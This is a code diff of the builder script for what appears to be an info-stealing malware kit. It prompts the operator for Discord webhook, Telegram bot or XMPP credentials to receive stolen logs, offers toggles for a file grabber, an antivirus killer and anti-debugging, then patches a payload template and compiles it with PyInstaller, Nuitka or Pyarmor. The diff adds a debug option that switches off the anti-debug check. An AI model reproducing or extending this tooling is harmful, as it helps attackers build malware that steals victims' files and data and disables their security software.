@@ -61,22 +61,33 @@ class Builder():
         self.HTTP = input("\033[33m\033[1m{}\033[0m".format(">>> "))
         print("\033[36m\033[4m{}\033[0m".format("(?) Telegram ID"))
         self.ID = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
+
+
         self.FG = ""
         while self.FG != "Y" and self.FG != "N" and self.FG != "n" and self.FG != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable File Grubber [y/n]"))
             self.FG = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
+
         self.oneStart = ""
         while self.oneStart != "Y" and self.oneStart != "N" and self.oneStart != "n" and self.oneStart != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable this if you want logs to come only from unique computers [y/n]"))
             self.oneStart = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+
         self.avKiller = ""
         while self.avKiller != "Y" and self.avKiller != "N" and self.avKiller != "n" and self.avKiller != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable antiviruses killer [y/n]"))
             self.avKiller = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+
+        self.debuging = ""
+        while self.debuging != "Y" and self.debuging != "N" and self.debuging != "n" and self.debuging != "y":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Enable debuging mode(write \"n\" if you don't know what it is) [y/n]"))
+            self.debuging = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+
         self.builder = ""
         while self.builder != "Pyinstaller" and self.builder != "Nuitka" and self.builder != "Pyarmor":
             print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Nuitka/Pyinstaller/Pyarmor)"))
             self.builder = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+
         self.libs = ""
         while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Do you have all needed Python libs [y/n]"))
@@ -89,7 +100,6 @@ class Builder():
             fullPath = fullPath.replace('\\Modules.zip', '')
             os.chdir(f'{fullPath}/files')
             os.system('start update.bat')
-            time.sleep(30)
             self.libs = "y"
             os.chdir(f'{fullPath}')
             
@@ -109,22 +119,33 @@ class Builder():
         self.urlWebHook = input("\033[33m\033[1m{}\033[0m".format(">>> "))
         print("\033[36m\033[4m{}\033[0m".format("(?) Bot name"))
         self.name = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
+
+
         self.FG = ""
         while self.FG != "Y" and self.FG != "N" and self.FG != "n" and self.FG != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable File Grubber [y/n]"))
             self.FG = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
+
         self.oneStart = ""
         while self.oneStart != "Y" and self.oneStart != "N" and self.oneStart != "n" and self.oneStart != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable this if you want logs to come only from unique computers [y/n]"))
             self.oneStart = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+
         self.avKiller = ""
         while self.avKiller != "Y" and self.avKiller != "N" and self.avKiller != "n" and self.avKiller != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable antiviruses killer [y/n]"))
             self.avKiller = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+
+        self.debuging = ""
+        while self.debuging != "Y" and self.debuging != "N" and self.debuging != "n" and self.debuging != "y":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Enable debuging mode(write \"n\" if you don't know what it is) [y/n]"))
+            self.debuging = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+
         self.builder = ""
         while self.builder != "Pyinstaller" and self.builder != "Nuitka" and self.builder != "Pyarmor":
             print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Nuitka/Pyinstaller/Pyarmor)"))
             self.builder = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+
         self.libs = ""
         while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Do you have all needed Python libs [y/n]"))
@@ -137,7 +158,6 @@ class Builder():
             fullPath = fullPath.replace('\\Modules.zip', '')
             os.chdir(f'{fullPath}/files')
             os.system('start update.bat')
-            time.sleep(30)
             self.libs = "y"
             os.chdir(f'{fullPath}')
             
@@ -157,22 +177,33 @@ class Builder():
         self.jabberpassword = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
         print("\033[36m\033[4m{}\033[0m".format("(?) jabberreceiver"))
         self.jabberreceiver = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
+
+
         self.FG = ""
         while self.FG != "Y" and self.FG != "N" and self.FG != "n" and self.FG != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable File Grubber [y/n]"))
             self.FG = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
+
         self.oneStart = ""
         while self.oneStart != "Y" and self.oneStart != "N" and self.oneStart != "n" and self.oneStart != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable this if you want logs to come only from unique computers [y/n]"))
             self.oneStart = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+
         self.avKiller = ""
         while self.avKiller != "Y" and self.avKiller != "N" and self.avKiller != "n" and self.avKiller != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable antiviruses killer [y/n]"))
             self.avKiller = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+
+        self.debuging = ""
+        while self.debuging != "Y" and self.debuging != "N" and self.debuging != "n" and self.debuging != "y":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Enable debuging mode(write \"n\" if you don't know what it is) [y/n]"))
+            self.debuging = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+
         self.builder = ""
         while self.builder != "Pyinstaller" and self.builder != "Nuitka" and self.builder != "Pyarmor":
             print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Nuitka/Pyinstaller/Pyarmor)"))
             self.builder = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+
         self.libs = ""
         while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Do you have all needed Python libs [y/n]"))
@@ -185,7 +216,6 @@ class Builder():
             fullPath = fullPath.replace('\\Modules.zip', '')
             os.chdir(f'{fullPath}/files')
             os.system('start update.bat')
-            time.sleep(30)
             self.libs = "y"
             os.chdir(f'{fullPath}')
             
@@ -220,6 +250,9 @@ class Builder():
         if self.oneStart == "Y" or self.oneStart == "y":
             data = data.replace('oneStart = False #enable this if you want logs to come only from unique computers', 'oneStart = True')
         
+        if self.debuging == "Y" or self.debuging == "y":
+            data = data.replace('debuging = False #disable AntiDebug', 'debuging = True')
+
         data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 2")
         data = data.replace('xmppData = ["jabberid","jabberpassword","jabberreceiver"]',f'xmppData = ["{jabberid}","{jabberpassword}","{jabberreceiver}"]')
 
@@ -279,6 +312,10 @@ class Builder():
         if self.oneStart == "Y" or self.oneStart == "y":
             data = data.replace('oneStart = False #enable this if you want logs to come only from unique computers', 'oneStart = True')
         
+        if self.debuging == "Y" or self.debuging == "y":
+            data = data.replace('debuging = False #disable AntiDebug', 'debuging = True')
+
+
         data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 0")
         data = data.replace('discordData = ["url of your WebHook","name of that WebHook"]',f'discordData = ["{urlWebHook}","{name}"]')
 
@@ -337,6 +374,10 @@ class Builder():
         if self.oneStart == "Y" or self.oneStart == "y":
             data = data.replace('oneStart = False #enable this if you want logs to come only from unique computers', 'oneStart = True')
         
+        if self.debuging == "Y" or self.debuging == "y":
+            data = data.replace('debuging = False #disable AntiDebug', 'debuging = True')
+
+
         data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 1")
         data = data.replace('TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]',f'TelegramData = ["{token}","{id}"]')
 
